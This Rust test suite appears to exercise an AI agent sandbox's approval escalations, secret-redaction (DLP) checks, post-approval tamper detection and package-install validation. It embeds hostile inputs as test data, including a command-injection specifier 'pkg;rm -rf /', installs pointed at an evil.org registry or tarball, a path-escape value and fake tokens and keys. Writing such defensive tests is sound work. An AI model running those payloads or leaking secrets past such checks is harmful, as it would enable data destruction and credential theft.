        // Point actual remote URL to bare repo while keeping second remote `secret_remote` for DLP test.
        assert!(run_sanitized_host_git(
            &git_bin,
            &host_repo,
            &[],
            &[
                "remote".into(),
                "add".into(),
                "leak".into(),
                "https://x-access-token:secretTok3n9999@github.com/heurion-org/aegis-os.git".into(),
            ]
        )
        .unwrap()
        .status
        .success());
        assert!(run_sanitized_host_git(
            &git_bin,
            &host_repo,
            &[],
            &[
                "remote".into(),
                "set-url".into(),
                "origin".into(),
                origin_bare.to_str().unwrap().to_string(),
            ]
        )
        .unwrap()
        .status
        .success());

        let kernel = Arc::new(AegisRuntimeKernel::new(&rt).await.unwrap());
        let agent = AgentIdentity::new("aegis-os", "release-bot", "Release Engineer");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // 1. Write edits ONLY in CoW shadow (do NOT call `workspace_commit`).
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({ "path": "src/new_feat.rs", "content": "pub fn feat() -> u32 { 42 }\n" }),
            )
            .await
            .unwrap();

        // Zero-prompt `workspace_git_inspect` reports pending shadow file count & scrubs remote URLs!
        let status = kernel
            .call_tool(&agent, "workspace_git_inspect", json!({ "mode": "status" }))
            .await
            .unwrap();
        assert_eq!(status["status"], "ok");
        assert!(
            status["shadow_uncommitted_files"]
                .as_array()
                .unwrap()
                .iter()
                .any(|v| v == "src/new_feat.rs"),
            "{status}"
        );
        let remotes = kernel
            .call_tool(&agent, "workspace_git_inspect", json!({ "mode": "remote" }))
            .await
            .unwrap();
        let rem_out = remotes["output"].as_str().unwrap();
        assert!(!rem_out.contains("secretTok3n9999"), "{rem_out}");
        assert!(rem_out.contains("[REDACTED_BY_AEGIS_DLP]"), "{rem_out}");

        // 2. Single-approval `workspace_git` with `auto_commit_shadow: true` + `verify_cmd` + `checkout_branch` + `push`!
        let tx_args = json!({
            "auto_commit_shadow": true,
            "verify_cmd": "test -f src/new_feat.rs",
            "checkout_branch": "feat/one-click",
            "create_branch": true,
            "commit_message": "feat: one-click shadow + git",
            "tag": "v0.9.0-test",
            "push": true,
            "remote": "origin"
        });
        let ask_tx = kernel
            .call_tool(&agent, "workspace_git", tx_args.clone())
            .await
            .unwrap();
        assert_eq!(ask_tx["status"], "approval_required");
        let esc_tx = ask_tx["escalation_id"].as_str().unwrap().to_string();
        kernel.policy.approve_escalation(&esc_tx, 0, "user").await.unwrap();

        // TOCTOU check: mutating CoW shadow after approval must invalidate the pinned OneShot lease.
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({ "path": "src/new_feat.rs", "content": "pub fn evil() {}\n" }),
            )
            .await
            .unwrap();
        let drifted_tx = kernel
            .call_tool(&agent, "workspace_git", tx_args.clone())
            .await
            .unwrap();
        assert_eq!(drifted_tx["status"], "approval_required");
        kernel
            .policy
            .approve_escalation(drifted_tx["escalation_id"].as_str().unwrap(), 0, "user")
            .await
            .unwrap();

        let done_tx = kernel
            .call_tool(&agent, "workspace_git", tx_args)
            .await
            .unwrap();
        assert_eq!(done_tx["status"], "git_completed", "{done_tx}");
        assert_eq!(done_tx["verified_shadow"], true);
        assert_eq!(done_tx["checked_out_branch"], "feat/one-click");
        assert_eq!(done_tx["pushed"], true);
        assert!(host_repo.join("src/new_feat.rs").is_file());

        // Verify bare remote received `refs/heads/feat/one-click` and `refs/tags/v0.9.0-test`.
        let show_ref = run_sanitized_host_git(&git_bin, &origin_bare, &[], &["show-ref".into()])
            .unwrap();
        let refs_txt = String::from_utf8_lossy(&show_ref.stdout);
        assert!(refs_txt.contains("refs/heads/feat/one-click"), "{refs_txt}");
        assert!(refs_txt.contains("refs/tags/v0.9.0-test"), "{refs_txt}");

        // 3. `force_push: true` triggers `workspace_git_sensitive` escalation (HIGH RISK).
        let force_args = json!({ "push": true, "force_push": true, "branch": "feat/one-click" });
        let ask_fp = kernel
            .call_tool(&agent, "workspace_git", force_args)
            .await
            .unwrap();
        assert_eq!(ask_fp["status"], "approval_required");
        assert!(
            ask_fp["reason"].as_str().unwrap().contains("force_push"),
            "{ask_fp}"
        );

        // 4. `github_ci_inspect` with non-GitHub origin (bare path) triggers cross-repo escalation;
        //    `github_pr_create` blocks secret patterns via DLP BEFORE creating an escalation.
        let ask_ci = kernel
            .call_tool(&agent, "github_ci_inspect", json!({ "repo": "heurion-org/aegis-os" }))
            .await
            .unwrap();
        assert_eq!(ask_ci["status"], "approval_required", "{ask_ci}");

        let dlp_err = kernel
            .call_tool(
                &agent,
                "github_pr_create",
                json!({
                    "repo": "heurion-org/aegis-os",
                    "title": "fix auth",
                    "body": "accidentally pasted ghp_1234567890abcdefghijklmnop"
                }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(dlp_err.contains("DLP policy"), "{dlp_err}");
    }

    #[tokio::test]
    async fn test_pkg_install_validation_pinning_and_host_symlink_isolation() {
        use std::os::unix::fs::PermissionsExt;

        std::env::set_var("AEGIS_ALLOW_NESTED_TEST_SANDBOX", "1");
        let tmp = tempfile::tempdir().unwrap();
        let rt = tmp.path().join("rt");
        let host_proj = tmp.path().join("host_proj");
        std::fs::create_dir_all(host_proj.join("node_modules/.bin")).unwrap();
        std::fs::write(host_proj.join("package.json"), r#"{"name":"demo","version":"1.0.0"}"#).unwrap();

        let fake_npm = host_proj.join("node_modules/.bin/npm");
        std::fs::write(
            &fake_npm,
            "#!/bin/sh\nset -eu\necho \"$*\" > .npm_invoked_args.txt\nmkdir -p node_modules/fake-pkg\necho 'exports.ok = true;' > node_modules/fake-pkg/index.js\n",
        )
        .unwrap();
        std::fs::set_permissions(&fake_npm, std::fs::Permissions::from_mode(0o755)).unwrap();

        let kernel = AegisRuntimeKernel::new(&rt).await.unwrap();
        let agent = AgentIdentity::new("aegis-os", "agy-agent", "Engineer");
        let env = kernel
            .ensure_agent_environment(agent.clone(), &host_proj, IsolationTier::NativeOsSandbox, vec![])
            .await
            .unwrap();

        // Shadow initially symlinks host `node_modules`.
        assert!(
            std::fs::symlink_metadata(env.workspace.shadow_root().join("node_modules"))
                .unwrap()
                .file_type()
                .is_symlink()
        );

        // 1. Unsafe package specifiers / URLs / flags are rejected pre-escalation.
        for bad in ["--registry=https://evil.org", "https://evil.org/pkg.tgz", "pkg;rm -rf /", "../escape"] {
            let err = kernel
                .call_tool(
                    &agent,
                    "pkg_install",
                    json!({ "manager": "npm", "packages": [bad], "offline": true }),
                )
                .await
                .unwrap_err()
                .to_string();
            assert!(err.contains("Invalid or unsafe package specifier"), "{bad}: {err}");
        }
        let go_bad = kernel
            .call_tool(
                &agent,
                "pkg_install",
                json!({ "manager": "go", "packages": ["localpkg"], "offline": true }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(go_bad.contains("qualified domain module path"), "{go_bad}");
        let go_rel = kernel
            .call_tool(
                &agent,
                "pkg_install",
                json!({ "manager": "go", "packages": ["./localpkg"], "offline": true }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(go_rel.contains("Invalid or unsafe package specifier"), "{go_rel}");

        // 2. `allow_scripts: true` escalates to `pkg_install_scripts`.
        let ask_scripts = kernel
            .call_tool(
                &agent,
                "pkg_install",
                json!({ "manager": "npm", "packages": ["fake-pkg"], "allow_scripts": true, "offline": true }),
            )
            .await
            .unwrap();
        assert_eq!(ask_scripts["status"], "approval_required");
        assert!(ask_scripts["reason"].as_str().unwrap().contains("LIFECYCLE SCRIPTS"));

        // 3. Safe install (`allow_scripts: false`, `offline: true`) pins `#sha256:` & detects TOCTOU drift.
        let args = json!({
            "manager": "npm",
            "packages": ["fake-pkg"],
            "allow_scripts": false,
            "offline": true
        });
        let ask_ok = kernel.call_tool(&agent, "pkg_install", args.clone()).await.unwrap();
        assert_eq!(ask_ok["status"], "approval_required");
        let esc1 = ask_ok["escalation_id"].as_str().unwrap().to_string();
        kernel.policy.approve_escalation(&esc1, 0, "user").await.unwrap();

        std::fs::write(
            env.workspace.shadow_root().join("package.json"),
            r#"{"name":"demo","version":"1.0.1"}"#,
        )
        .unwrap();
        let drifted = kernel.call_tool(&agent, "pkg_install", args.clone()).await.unwrap();
        assert_eq!(
            drifted["status"], "approval_required",
            "Manifest mutation after approval must invalidate pinned lease: {drifted}"
        );

        let esc2 = drifted["escalation_id"].as_str().unwrap().to_string();
        kernel.policy.approve_escalation(&esc2, 0, "user").await.unwrap();
        let res = kernel.call_tool(&agent, "pkg_install", args).await.unwrap();
        assert_eq!(res["status"], "pkg_installed", "{res}");
        assert_eq!(res["host_modified"], false);

        // Verify shadow `node_modules` was unlinked from host symlink & host repo stayed untouched.
        assert!(
            !std::fs::symlink_metadata(env.workspace.shadow_root().join("node_modules"))
                .unwrap()
                .file_type()
                .is_symlink(),
            "shadow node_modules must no longer be a host symlink after install"
        );
        assert!(env
            .workspace
            .shadow_root()
            .join("node_modules/fake-pkg/index.js")
            .is_file());
        assert!(!host_proj.join("node_modules/fake-pkg").exists());
        let invoked = std::fs::read_to_string(
            env.workspace.shadow_root().join(".npm_invoked_args.txt"),
        )
        .unwrap();
        assert!(invoked.contains("--ignore-scripts"), "{invoked}");
        assert!(invoked.contains("--offline"), "{invoked}");
        assert!(invoked.contains("fake-pkg"), "{invoked}");
    }

    #[tokio::test]
    async fn test_github_comment_pr_merge_dlp_pinning_and_structured_evidence() {
        let temp = tempfile::tempdir().unwrap();
        let host_proj = temp.path().join("gh_proj");
        std::fs::create_dir_all(host_proj.join(".git")).unwrap();
        std::fs::write(
            host_proj.join(".git/config"),
            "[remote \"origin\"]\n\turl = git@github.com:heurion-org/demo-repo.git\n",
        )
        .unwrap();
        std::fs::write(host_proj.join("README.md"), "# Demo\n").unwrap();

        let kernel = AegisRuntimeKernel::new(temp.path().join("rt")).await.unwrap();
        let agent = AgentIdentity::new("aegis-os", "agy-agent", "Coder");
        kernel
            .ensure_agent_environment(agent.clone(), &host_proj, IsolationTier::NativeOsSandbox, vec![])
            .await
            .unwrap();

        // 1. DLP blocks leaked secrets in comment body & PR merge subject/body
        let bad_comment = kernel
            .call_tool(
                &agent,
                "github_comment_create",
                json!({ "number": 12, "body": "Token ghp_RealSecretToken1234567890abcdef" }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(bad_comment.contains("DLP policy"), "{bad_comment}");

        let bad_merge = kernel
            .call_tool(
                &agent,
                "github_pr_merge",
                json!({
                    "pr_number": 12,
                    "method": "squash",
                    "subject": "Merge PR with AKIAIOSFODNN7EXAMPLE"
                }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(bad_merge.contains("DLP policy"), "{bad_merge}");

        // 2. github_comment_create populates PendingEscalation.evidence and #sha256: pins
        let ask_comment = kernel
            .call_tool(
                &agent,
                "github_comment_create",
                json!({ "number": 12, "body": "Verified CI pass." }),
            )
            .await
            .unwrap();
        assert_eq!(ask_comment["status"], "approval_required");
        let esc_c = ask_comment["escalation_id"].as_str().unwrap().to_string();
        let escalations = kernel.policy.list_escalations("aegis-os").await.unwrap();
        let rec_c = escalations.iter().find(|e| e.escalation_id == esc_c).unwrap();
        let ev_c = rec_c.evidence.as_ref().expect("comment escalation must include evidence");
        assert_eq!(ev_c["repo"], "heurion-org/demo-repo");
        assert_eq!(ev_c["number"], 12);
        let lease_c = kernel.policy.approve_escalation(&esc_c, 0, "user").await.unwrap();
        assert!(lease_c.resource_pattern.contains("#sha256:"));

        // 3. github_pr_merge populates structured evidence
        let ask_merge = kernel
            .call_tool(
                &agent,
                "github_pr_merge",
                json!({ "pr_number": 12, "method": "squash", "delete_branch": true }),
            )
            .await
            .unwrap();
        assert_eq!(ask_merge["status"], "approval_required");
        let esc_m = ask_merge["escalation_id"].as_str().unwrap().to_string();
        let escalations = kernel.policy.list_escalations("aegis-os").await.unwrap();
        let rec_m = escalations.iter().find(|e| e.escalation_id == esc_m).unwrap();
        let ev_m = rec_m.evidence.as_ref().expect("merge escalation must include evidence");
        assert_eq!(ev_m["pr_number"], 12);
        assert_eq!(ev_m["method"], "squash");
        assert_eq!(ev_m["delete_branch"], true);

        // 4. Web approval templates render structured cards and forbid emojis on dashboard
        assert!(approver::APPROVE_PAGE_HTML.contains("pkg_install_scripts"));
        assert!(approver::APPROVE_PAGE_HTML.contains("github_pr_merge"));
        assert!(approver::APPROVE_PAGE_HTML.contains("isHighRisk"));
        let dash = paas::render_dashboard_html(&host_proj);
        assert!(dash.contains("pkg_install_scripts"));
        assert!(dash.contains("github_pr_merge"));
        assert!(dash.contains("isHighRisk"));
        assert!(!dash.chars().any(|c| ('\u{1F300}'..='\u{1FAFF}').contains(&c)));
    }
}
